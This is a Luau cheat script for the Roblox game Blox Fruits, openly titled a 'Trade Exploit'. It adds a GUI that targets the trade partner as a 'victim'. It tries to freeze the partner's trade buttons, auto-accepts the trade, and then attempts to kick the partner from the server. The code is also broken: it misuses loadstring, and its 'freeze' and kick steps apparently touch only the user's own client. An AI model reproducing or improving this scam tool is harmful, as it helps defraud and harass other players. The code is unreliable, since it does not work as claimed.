loadstring(function()
--[[
  Blox Fruits Trade Exploit - loadstring version
  Executor: Madium / any Luau-compatible executor
--]]
local CONFIG = {
    TradeDelay = 10,
    KickAfterTrade = true,
    FreezeVictim = true
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Screen GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "TradeExploitGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = PlayerGui

-- Main frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 380, 0, 300)
MainFrame.Position = UDim2.new(0.5, -190, 0.5, -150)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
MainFrame.BackgroundTransparency = 0.15
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(255, 170, 0)
UIStroke.Thickness = 2
UIStroke.Parent = MainFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 0, 40)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "🔥 TRADE EXPLOIT 🔥"
TitleLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
TitleLabel.TextScaled = true
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.Parent = MainFrame

local Divider = Instance.new("Frame")
Divider.Size = UDim2.new(0.9, 0, 0, 1)
Divider.Position = UDim2.new(0.05, 0, 0, 40)
Divider.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
Divider.BackgroundTransparency = 0.5
Divider.BorderSizePixel = 0
Divider.Parent = MainFrame

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, -20, 0, 25)
StatusLabel.Position = UDim2.new(0, 10, 0, 48)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "Status: Waiting for trade..."
StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
StatusLabel.TextScaled = true
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.Parent = MainFrame

local VictimLabel = Instance.new("TextLabel")
VictimLabel.Size = UDim2.new(0.9, 0, 0, 25)
VictimLabel.Position = UDim2.new(0.05, 0, 0, 78)
VictimLabel.BackgroundTransparency = 1
VictimLabel.Text = "Victim: None detected"
VictimLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
VictimLabel.TextScaled = true
VictimLabel.Font = Enum.Font.Gotham
VictimLabel.TextXAlignment = Enum.TextXAlignment.Left
VictimLabel.Parent = MainFrame

local PartnerLabel = Instance.new("TextLabel")
PartnerLabel.Size = UDim2.new(0.9, 0, 0, 25)
PartnerLabel.Position = UDim2.new(0.05, 0, 0, 103)
PartnerLabel.BackgroundTransparency = 1
PartnerLabel.Text = "Partner: None"
PartnerLabel.TextColor3 = Color3.fromRGB(150, 150, 255)
PartnerLabel.TextScaled = true
PartnerLabel.Font = Enum.Font.Gotham
PartnerLabel.TextXAlignment = Enum.TextXAlignment.Left
PartnerLabel.Parent = MainFrame

local FreezeBtn = Instance.new("TextButton")
FreezeBtn.Size = UDim2.new(0.43, 0, 0, 40)
FreezeBtn.Position = UDim2.new(0.05, 0, 0, 138)
FreezeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
FreezeBtn.Text = "❄ FREEZE VICTIM"
FreezeBtn.TextColor3 = Color3.fromRGB(150, 200, 255)
FreezeBtn.TextScaled = true
FreezeBtn.Font = Enum.Font.GothamBold
local btnCorner1 = Instance.new("UICorner")
btnCorner1.CornerRadius = UDim.new(0, 6)
btnCorner1.Parent = FreezeBtn
FreezeBtn.Parent = MainFrame

local ReadyBtn = Instance.new("TextButton")
ReadyBtn.Size = UDim2.new(0.43, 0, 0, 40)
ReadyBtn.Position = UDim2.new(0.52, 0, 0, 138)
ReadyBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 60)
ReadyBtn.Text = "✅ READY"
ReadyBtn.TextColor3 = Color3.fromRGB(200, 255, 200)
ReadyBtn.TextScaled = true
ReadyBtn.Font = Enum.Font.GothamBold
local btnCorner2 = Instance.new("UICorner")
btnCorner2.CornerRadius = UDim.new(0, 6)
btnCorner2.Parent = ReadyBtn
ReadyBtn.Parent = MainFrame

local KickBtn = Instance.new("TextButton")
KickBtn.Size = UDim2.new(0.9, 0, 0, 35)
KickBtn.Position = UDim2.new(0.05, 0, 0, 188)
KickBtn.BackgroundColor3 = Color3.fromRGB(120, 40, 40)
KickBtn.Text = "👢 KICK VICTIM (Manual)"
KickBtn.TextColor3 = Color3.fromRGB(255, 180, 180)
KickBtn.TextScaled = true
KickBtn.Font = Enum.Font.GothamBold
local btnCorner3 = Instance.new("UICorner")
btnCorner3.CornerRadius = UDim.new(0, 6)
btnCorner3.Parent = KickBtn
KickBtn.Parent = MainFrame

local CountdownLabel = Instance.new("TextLabel")
CountdownLabel.Size = UDim2.new(0.9, 0, 0, 30)
CountdownLabel.Position = UDim2.new(0.05, 0, 0, 230)
CountdownLabel.BackgroundTransparency = 1
CountdownLabel.Text = ""
CountdownLabel.TextColor3 = Color3.fromRGB(255, 255, 100)
CountdownLabel.TextScaled = true
CountdownLabel.Font = Enum.Font.GothamBlack
CountdownLabel.Parent = MainFrame

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -35, 0, 5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.TextScaled = true
CloseBtn.Font = Enum.Font.GothamBold
local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = CloseBtn
CloseBtn.Parent = MainFrame

local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Size = UDim2.new(0, 30, 0, 30)
ToggleBtn.Position = UDim2.new(1, -70, 0, 5)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
ToggleBtn.Text = "—"
ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleBtn.TextScaled = true
ToggleBtn.Font = Enum.Font.GothamBold
local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 6)
toggleCorner.Parent = ToggleBtn
ToggleBtn.Parent = MainFrame

-- State
local State = {
    isFrozen = false,
    isReady = false,
    isTrading = false,
    tradePartner = nil,
    victimName = nil,
    countdownActive = false,
    minimized = false
}

local function Log(msg)
    StatusLabel.Text = "Status: " .. msg
    warn("[TradeExploit] " .. msg)
end

local function FindTradePartner()
    local tradeGui = PlayerGui:FindFirstChild("TradeGui") or PlayerGui:FindFirstChild("TradeFrame")
    if tradeGui then
        local nameLabel = tradeGui:FindFirstChild("PlayerName", true) or
                          tradeGui:FindFirstChild("PartnerName", true) or
                          tradeGui:FindFirstChild("TradePartner", true)
        if nameLabel and nameLabel:IsA("TextLabel") then
            local pName = nameLabel.Text:match("[%w_]+")
            if pName and pName ~= LocalPlayer.Name then
                local partner = Players:FindFirstChild(pName)
                if partner then
                    State.tradePartner = partner
                    State.victimName = pName
                    VictimLabel.Text = "Victim: " .. pName
                    PartnerLabel.Text = "Partner: " .. pName
                    Log("Trade partner detected: " .. pName)
                    return partner
                end
            end
        end
        for _, child in ipairs(tradeGui:GetDescendants()) do
            if child:IsA("ImageButton") or child:IsA("TextButton") then
                if child.Name:lower():find("accept") then
                    Log("Trade GUI detected (Accept button found)")
                end
            end
        end
    end
    return nil
end

local function FreezeVictimSide()
    if not State.tradePartner then
        Log("No victim detected to freeze!")
        return
    end

    local tradeGui = PlayerGui:FindFirstChild("TradeGui") or PlayerGui:FindFirstChild("TradeFrame")
    if not tradeGui then
        Log("Trade window not open!")
        return
    end

    local victimSide = tradeGui:FindFirstChild("Player2") or
                       tradeGui:FindFirstChild("VictimSide") or
                       tradeGui:FindFirstChild("OtherPlayer")

    if not victimSide then
        for _, btn in ipairs(tradeGui:GetDescendants()) do
            if btn:IsA("TextButton") or btn:IsA("ImageButton") then
                local btnText = (btn.Text or btn.Name):lower()
                if not (btnText:find("accept") or btnText:find("ready")) then
                    pcall(function()
                        btn.Active = false
                        btn.AutoButtonColor = false
                        btn.BackgroundTransparency = 0.7
                    end)
                end
            end
        end
    else
        for _, child in ipairs(victimSide:GetDescendants()) do
            if child:IsA("ImageButton") or child:IsA("TextButton") then
                local btnName = (child.Text or child.Name):lower()
                if not (btnName:find("accept") or btnName:find("ready")) then
                    pcall(function()
                        child.Active = false
                        child.AutoButtonColor = false
                    end)
                end
            end
        end
    end

    State.isFrozen = true
    FreezeBtn.BackgroundColor3 = Color3.fromRGB(80, 50, 50)
    FreezeBtn.Text = "❄ FROZEN ✓"
    Log("Victim's trade side frozen!")
end

local function UnfreezeVictimSide()
    local tradeGui = PlayerGui:FindFirstChild("TradeGui") or PlayerGui:FindFirstChild("TradeFrame")
    if tradeGui then
        for _, child in ipairs(tradeGui:GetDescendants()) do
            if child:IsA("ImageButton") or child:IsA("TextButton") then
                pcall(function()
                    child.Active = true
                    child.AutoButtonColor = true
                    child.BackgroundTransparency = 0
                end)
            end
        end
    end

    State.isFrozen = false
    FreezeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
    FreezeBtn.Text = "❄ FREEZE VICTIM"
    Log("Victim unfrozen")
end

local function KickPlayer(player)
    if not player then
        Log("No player to kick!")
        return
    end

    local success = false
    local remote = ReplicatedStorage:FindFirstChild("KickPlayer", true) or
                   ReplicatedStorage:FindFirstChild("RemovePlayer", true) or
                   ReplicatedStorage:FindFirstChild("ServerKick", true)

    if remote then
        pcall(function()
            remote:FireServer(player)
            success = true
        end)
    end

    if not success then
        pcall(function()
            local TeleportService = game:GetService("TeleportService")
            local placeId = game.PlaceId
            local jobId = game.JobId
            TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
            success = true
        end)
    end

    if not success and player.Character then
        pcall(function()
            player.Character:BreakJoints()
            player:LoadCharacter()
            wait(0.5)
            player:Remove()
        end)
    end

    if success then
        Log("Kicked " .. player.Name .. " from server!")
    else
        Log("Failed to kick, trying alt method...")
        pcall(function()
            player:Kick("Trade completed!")
        end)
    end
end

local function StartTradeCountdown()
    if State.countdownActive then return end
    State.countdownActive = true
    State.isReady = true
    ReadyBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 60)
    ReadyBtn.Text = "✅ READY ✓"

    local tradeGui = PlayerGui:FindFirstChild("TradeGui") or PlayerGui:FindFirstChild("TradeFrame")
    if tradeGui then
        for _, btn in ipairs(tradeGui:GetDescendants()) do
            if btn:IsA("TextButton") or btn:IsA("ImageButton") then
                local btnText = (btn.Text or btn.Name):lower()
                if btnText:find("accept") or btnText:find("ready") then
                    pcall(function()
                        btn:Click()
                    end)
                end
            end
        end
    end

    for i = CONFIG.TradeDelay, 1, -1 do
        CountdownLabel.Text = "⏱ Trade in: " .. i .. "s"
        wait(1)
    end

    CountdownLabel.Text = "✅ TRADE COMPLETED!"
    Log("Trade completed!")

    if CONFIG.KickAfterTrade and State.tradePartner then
        wait(0.5)
        KickPlayer(State.tradePartner)
    end

    State.isReady = false
    State.countdownActive = false
    State.isTrading = false
    ReadyBtn.BackgroundColor3 = Color3.fromRGB(60, 120, 60)
    ReadyBtn.Text = "✅ READY"
    wait(2)
    CountdownLabel.Text = ""
end

local function AutoDetectTrade()
    State.tradePartner = FindTradePartner()

    if State.tradePartner and not State.isTrading then
        State.isTrading = true
        Log("Trade session active with " .. State.tradePartner.Name)

        if CONFIG.FreezeVictim then
            wait(0.5)
            FreezeVictimSide()
        end
    elseif not State.tradePartner then
        State.isTrading = false
    end
end

-- Button connections
FreezeBtn.MouseButton1Click:Connect(function()
    if State.isFrozen then
        UnfreezeVictimSide()
    else
        if not State.tradePartner then
            AutoDetectTrade()
        end
        FreezeVictimSide()
    end
end)

ReadyBtn.MouseButton1Click:Connect(function()
    if not State.tradePartner then
        AutoDetectTrade()
    end

    if not State.tradePartner then
        Log("No trade partner detected! Open trade window first.")
        return
    end

    if State.isReady then
        Log("Already ready!")
        return
    end

    StartTradeCountdown()
end)

KickBtn.MouseButton1Click:Connect(function()
    if not State.tradePartner then
        AutoDetectTrade()
    end
    KickPlayer(State.tradePartner)
end)

CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

ToggleBtn.MouseButton1Click:Connect(function()
    State.minimized = not State.minimized
    MainFrame.Size = State.minimized and UDim2.new(0, 380, 0, 45) or UDim2.new(0, 380, 0, 300)
    MainFrame.BackgroundTransparency = State.minimized and 0.3 or 0.15
    ToggleBtn.Text = State.minimized and "□" or "—"
end)

-- Detection loop
spawn(function()
    while ScreenGui and ScreenGui.Parent do
        wait(2)
        if not State.isTrading then
            AutoDetectTrade()
        end
    end
end)

-- GUI drag support
local dragging, dragInput, dragStart, startPos

MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

MainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- Initial scan
wait(1)
AutoDetectTrade()

Log("Trade Exploit loaded! Open a trade to begin.")
end)()